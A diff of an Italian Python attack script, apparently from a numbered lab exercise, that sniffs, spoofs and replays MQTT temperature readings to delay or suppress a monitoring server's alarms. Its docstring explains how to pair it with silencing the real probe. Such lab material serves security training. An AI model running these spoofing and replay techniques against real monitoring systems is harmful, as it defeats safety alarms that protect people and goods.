@@ -1,4 +1,4 @@
-"""Scenario 2: letture MQTT intercettate, falsificate o ripetute.
+"""Scenario 2: letture del monitoraggio indipendente falsificate o ripetute.
 
   python scenario2_letture.py ascolta [--secondi 15]
       si iscrive a tutti i topic (#) e mostra cosa passa sul broker
@@ -9,9 +9,10 @@
   python scenario2_letture.py replay [--registra 30] [--al-secondo 4] [--secondi 600]
       registra letture autentiche e poi le ripete in ciclo
 
-Il server degli allarmi scatta solo dopo alcune letture consecutive sopra soglia.
-Inviando letture "normali" più spesso della sonda vera, le letture reali non
-riescono mai a formare una sequenza consecutiva e l'allarme non scatta.
+Da solo, lo scenario ritarda l'allarme ma non lo impedisce: finché la sonda
+vera trasmette, la sua prima lettura sopra la soglia critica fa scattare
+l'allarme critico. L'uso tipico è dopo lo scenario 3: la sonda vera tace e
+le letture dell'attaccante ne prendono il posto.
 """
 
 import argparse
@@ -23,7 +24,7 @@ import uuid
 import paho.mqtt.client as mqtt
 
 BROKER = os.environ.get("BROKER_HOST", "10.77.10.20")
-TOPIC = os.environ.get("DATA_TOPIC", "store/freezer1/temperature")
+TOPIC = os.environ.get("DATA_TOPIC", "monitoraggio/banco1/temperatura")
 
 
 def connect(on_message=None):
@@ -55,7 +56,7 @@ def spoof(temp, rate, seconds):
     end = time.time() + seconds
     while time.time() < end:
         seq += 1
-        payload = {"sensor": "probe1", "temp_c": temp, "ts": int(time.time()), "seq": seq}
+        payload = {"sensor": "sonda1", "temp_c": temp, "ts": int(time.time()), "seq": seq}
         client.publish(TOPIC, json.dumps(payload))
         time.sleep(1 / rate)
     client.disconnect()
